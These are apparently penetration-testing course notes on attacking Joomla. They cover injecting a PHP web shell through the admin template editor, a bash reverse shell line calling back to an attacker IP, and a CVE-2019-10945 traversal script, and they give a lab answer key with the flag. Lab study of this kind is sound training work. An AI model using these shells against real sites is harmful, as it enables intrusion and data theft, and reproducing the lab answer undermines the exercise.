# Section 6 — Attacking Joomla

## ID
534

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 6 — Attacking Joomla

## Description
Covers Joomla exploitation via template editor RCE (similar to WordPress theme editor), and leveraging CVE-2019-10945 for authenticated directory traversal and file deletion.

## Tags
joomla, rce, template-editor, directory-traversal, cve-2019-10945, web-shell

## Commands
- `curl -s http://<TARGET>/templates/protostar/error.php?<PARAM>=id`
- `python2.7 joomla_dir_trav.py --url "http://<TARGET>/administrator/" --username <USER> --password <PASS> --dir /`
- `nc -nvlp <PORT>`

## What This Section Covers
How to achieve code execution on Joomla once admin credentials are obtained, using the built-in template editor to inject PHP into template files. Also covers CVE-2019-10945, an authenticated directory traversal vulnerability affecting Joomla 1.5.0 through 3.9.4 that allows listing directory contents and deleting files.

## Methodology

1. **Log in to Joomla admin** at `/administrator/index.php` with recovered credentials.

2. **Navigate to template editor**: Templates (bottom left under Configuration) → click template name (e.g., **Protostar**) under the Template column → click a file to edit (e.g., `error.php`).

3. **Inject PHP web shell** into the template file. Use a non-obvious parameter name:
   ```php
   system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
   ```
   Click **Save & Close**.

4. **Test code execution**:
   ```
   curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
   ```

5. **Upgrade to reverse shell** — instead of the simple web shell, inject:
   ```php
   exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'");
   ```
   Start listener: `nc -nvlp <PORT>`, then browse to `http://<TARGET>/templates/protostar/error.php`.

6. **Alternative: CVE-2019-10945 directory traversal** (Joomla 1.5.0–3.9.4) — list webroot contents without a shell:
   ```
   python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
   ```
   Can also delete files (not recommended during assessments).

## Joomla Template Editor RCE vs WordPress Theme Editor RCE

| Aspect | Joomla | WordPress |
|--------|--------|-----------|
| Path to editor | Templates → Template name → file | Appearance → Theme Editor → file |
| Recommended file | `error.php` | `404.php` |
| Shell location | `/templates/<theme>/error.php` | `/wp-content/themes/<theme>/404.php` |
| Best practice | Edit inactive template | Edit inactive theme |

## CVE-2019-10945 — Directory Traversal & File Deletion

- **Affected versions**: Joomla 1.5.0 through 3.9.4
- **Requirements**: Authenticated (admin creds)
- **Capabilities**: List directory contents, delete arbitrary files
- **Use case**: Useful when admin panel is not externally accessible but you have creds — can expose `configuration.php` or other sensitive files
- **Python3 version available** alongside the Python2.7 script

## Web Shell Best Practices (from the section)

- Use non-standard parameter names (e.g., MD5 hash) — not `cmd` or `c`
- Password-protect the shell if possible
- Limit access to your source IP
- Clean up immediately after use
- Document in report: filename, file hash, location, and whether cleanup was successful

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Flag in webroot via directory traversal | j00mla_c0re_d1rtrav3rsal! | Login as admin:admin → Templates → Protostar → edit error.php → inject reverse shell → `cat /var/www/dev.inlanefreight.local/flag_*.txt` |

## Key Takeaways

- **Joomla template editor RCE follows the same pattern as WordPress** — admin creds → edit template file → inject PHP → trigger via URL
- **CVE-2019-10945 is authenticated** — if you already have admin creds you can just get RCE via the template editor instead, making the dir traversal only useful in edge cases (e.g., admin panel blocked externally)
- **426 CVEs for Joomla** but most are in extensions, not core — critical core RCEs are rare, same pattern as WordPress
- **Always use non-obvious web shell parameters** — a parameter named `cmd` is trivially discoverable by other attackers
- **The lab uses admin:admin credentials** from the previous section's enumeration, not admin:turnkey (which was the other lab target)

## Gotchas

- After logging into Joomla admin, you may get "Call to a member function format() on null" error — fix by navigating to `?option=com_plugins` and disabling "Quick Icon - PHP Version Check"
- The flag file has a hash in its name (`flag_6470e394cbf6dab6a91682cc8585059b.txt`) — use `cat /var/www/dev.inlanefreight.local/flag_*.txt` or `ls` the directory first
- Template files are at `/templates/<theme>/` not `/wp-content/themes/<theme>/` — different path structure from WordPress
- The dir traversal exploit script has both Python 2.7 and Python 3 versions — make sure you grab the right one
